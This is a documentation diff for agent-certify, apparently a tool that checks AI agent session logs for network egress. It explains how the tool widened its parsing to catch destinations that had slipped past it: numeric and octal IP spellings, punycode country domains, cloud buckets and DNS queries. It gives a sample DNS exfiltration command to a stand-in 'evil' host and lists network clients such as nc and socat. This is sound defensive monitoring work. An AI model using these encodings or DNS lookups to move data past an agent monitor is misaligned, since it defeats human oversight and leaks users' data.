@@ -138,13 +138,56 @@ This is the one place where agent-certify looks *inside* a tool call rather
 than at its shape, so it is spelled out in full.
 
 **What is read.** For every tool call in a session, the call's arguments are
-walked for host names: the host of any full URL (`http`, `https`, `ws`, `wss`,
-`ftp`, `ftps`), and the value of a field that names a destination (`url`,
-`host`, `endpoint`, `base_url`, `webhook_url` … the full set is `NETWORK_KEYS`
-in `agent_certify/domains.py`). A tool call's **result** is walked the same way,
+walked for host names: the host of any full URL, and the value of a field that
+names a destination (`url`, `host`, `endpoint`, `base_url`, `webhook_url` … the
+full set is `NETWORK_KEYS` in `agent_certify/domains.py`). A tool call's
+**result** is walked the same way,
 but only when that call's own arguments already carried a destination — so a
 file read or a search result full of URLs is not treated as egress. The walk is
 bounded (8 levels deep, 2,000 strings, 64 KB per string, 200 hosts per call).
+
+**Which URLs, and what a destination is allowed to look like** (widened in
+v0.8.0, after an audit found that each of these reached its destination while
+the report said nothing at all — no host, no truncation, no warning):
+
+- **the schemes read are not only the web's.** `http(s)`, `ws(s)` and `ftp(s)`,
+  and also `s3`, `gs`, `azure`, `abfs(s)`, `wasb(s)`, `smb`, `ssh`, `sftp`,
+  `scp`, `rsync`, `tftp`, `redis(s)`, `postgres(ql)`, `mysql`, `mongodb`,
+  `mongodb+srv`, `amqp(s)`, `mqtt`, `ldap(s)` — the list is `URL_SCHEMES`. A
+  scheme glued to a preceding word is not a scheme: `logs://x` names nothing.
+- **a bucket or a configured remote is a destination without a host name.**
+  `s3://logs-eu/key` names a bucket at whichever endpoint the client was
+  configured for; `rclone copy f backup:dir` names a remote whose address is in
+  rclone's own configuration file. They are recorded as `s3:logs-eu`,
+  `gs:logs-eu` and `rclone:backup` — `<kind>:<name>`, a shape no host name can
+  take, so no code downstream treats one as resolvable. The operator's accept
+  and reject patterns apply as they do to a host (`s3:logs-eu` matches itself,
+  `s3:*` matches every bucket of that kind; there is no `*.` wildcard, because
+  a bucket name has no subdomains), and the **region is always `unknown`**: a
+  bucket name says nothing about where the bucket is, and nothing is resolved
+  for it, not even with `--resolve-dns`.
+- **an address is canonicalised before anything else.** `2130706433`,
+  `0x7f000001`, `0177.0.0.1` and `127.1` are what `inet_aton` and therefore
+  every browser and every socket library read as 127.0.0.1; all four are
+  normalised to the dotted quad, and that one spelling is what is recorded and
+  matched. A number with fewer than four parts whose first octet would be zero
+  is not read as an address, which is what keeps a port or a count from
+  becoming one.
+- **an internationalised name is converted to punycode.** `collector.рф`
+  becomes `collector.xn--p1ai` and that is what is kept, so one pattern covers
+  both spellings; a pattern typed in Unicode is converted the same way. The
+  conversion is the standard library's `idna` codec, it touches no network, and
+  it never raises: a name it cannot convert is left alone and then fails the
+  shape test like any other non-host. A host shape may now end in a punycode
+  tag (`xn--…`) as well as in letters. **An internationalised ccTLD names its
+  country** like any other, offline, reported as `ccTLD (IDN)`: the table
+  (`IDN_CCTLD_COUNTRY` in `agent_certify/regions.py`) is all 61 delegated IDN
+  ccTLDs with the IANA Root Zone Database's own `iso3166_code` for each,
+  transcribed from its machine-readable form and pinned by a test to the day it
+  was last checked. Without it a `forbidden_region RU` rule did not reach
+  `collector.xn--p1ai` — the destination was recorded and reported as new, and
+  the rule said nothing, which is the failure mode of a control that looks like
+  it is working.
 
 **What is not read at all** (since v0.8.0). Two categories of value are
 skipped before anything else happens, because reading them produced findings
@@ -160,14 +203,24 @@ about traffic that never existed:
   writes; the `Bash` call that later runs what was written is read exactly as
   before, since `command` is not a content key.
 - **anything that is not shaped like a host.** The host of a URL now passes the
-  same shape test as a bare value: at least one dot and a letters-only suffix,
-  or an address literal (v4 or bracketed v6), or `localhost`. Trailing prose
+  same shape test as a bare value: at least one dot and a letters-only or
+  punycode suffix, an address literal (v4 in any of its spellings, or bracketed
+  v6), `localhost`, or a `<kind>:<name>` bucket or remote. Trailing prose
   and markdown punctuation is stripped first. `https://a`, `http://api/x` and a
   URL at the end of a markdown span used to be recorded as the destinations
   `a`, `api` and `` x.example.com` ``.
 
 Measured over eleven held-out real sessions (baselines of two to four sessions, so a worst case), before and after, back to back on the same files: **109 anomalies before, 72 after; 94 critical before, 58 after**. Of the 104 hosts read before, 43 stopped being read, and **not one of them had been contacted** — traced key by key: 16 were not shaped like a host, 19 appeared only in a file-writing argument, 8 were a fragment of a quoted argument. Every genuine destination survived, the outbound-volume spike included. The benchmark injects a clean `Write` call whose contents name a
 host (`written_url`) so the content claim stays measured.
+
+The v0.8.0 widening was measured the same way, on the same held-out sessions,
+before and after, per check and per severity: **no new anomaly** on any session
+that was not itself about testing this feature, and no alert lost except two
+words glued to a scheme, which the scheme guard now refuses. On the injection
+benchmark the five faults are detected on every trial. The honest reading is
+that the new readers found nothing on logs written before they existed, and
+that is what was expected: what they close is a gap in what *can* be reported,
+not a backlog of missed traffic.
 
 **The command line of a shell tool call is read too** (since the
 `shell_domain` blind spot was closed; it is a *new category of input data*, so
@@ -186,6 +239,39 @@ arguments of a known network client** (`curl`, `wget`, `ssh`, `scp`, `nc`,
 arguments of any other program, and nothing of the command line itself — not
 the program, not the flags, not the data, not file paths, not credentials in a
 `-u` argument — is kept, logged, reported or transmitted.
+
+`NETWORK_COMMANDS` was widened in v0.8.0, in five families: the web and remote
+shells (`curl`, `wget`, httpie, `nc`, `socat`, `telnet`, `ssh`, `scp`, `sftp`,
+`rsync`, `ftp`, `tftp`, `smbclient`, `git`), PowerShell's web cmdlets, object
+storage and cloud CLIs (`aws`, `gcloud`, `gsutil`, `az`, `azcopy`, `rclone`,
+`mc`, `s3cmd`, `kubectl` — by endpoint option, bucket URL or `remote:path`),
+resolvers (`dig`, `nslookup`, `host`, `drill`) and database, cache and TLS
+clients (`psql`, `mysql`, `mysqldump`, `redis-cli`, `mongosh`, `mongo`,
+`mongodump`, `openssl s_client`). For the last three families the destination
+is taken from a named option or a connection URL rather than from the shape of
+a positional argument, because a bucket name, a resource name and a database
+name all look alike: `aws --version`, `kubectl get pods`, `psql -f file.sql`
+and `rclone listremotes` name no destination and produce none.
+
+**For a resolver, the name being queried is the destination.**
+`dig secret-data.evil.example.net +short` opens no connection to that host and
+sends no payload — and tells whoever operates that zone what the name says. DNS
+exfiltration is not a connection, so a reader that looks only for connections
+reports nothing about it. `dig @server` and `drill @server` also name the
+server asked.
+
+**A command substitution is read, one level deep.** `$(…)` and backticks hold a
+command line, and a command line can reach somewhere, so the contents are read
+as one — and then removed from the line that held them, since a substitution is
+not a token of the line around it. That is what makes both
+`X=$(curl host/x)`, where the substitution is the whole command, and
+`TOKEN=$(cat /tmp/t) curl api.example.net/v1`, where it stands between the
+shell and the program, read correctly. Nothing is expanded or executed: the
+text inside is parsed exactly as the text outside is. When the depth limit
+stops a nesting whose text holds a URL or the name of a known client, the call
+is counted as a truncated scan and the anomaly is raised; a nesting holding
+neither — `ssh host 'JOB=$(sbatch …)'` — is not reported, because it was read
+far enough to establish that there is nothing in it to miss.
 
 A command **inside** a command is read the same way, one level deep
 (`MAX_SHELL_DEPTH = 1`): the value of `bash -c` and the other shell wrappers
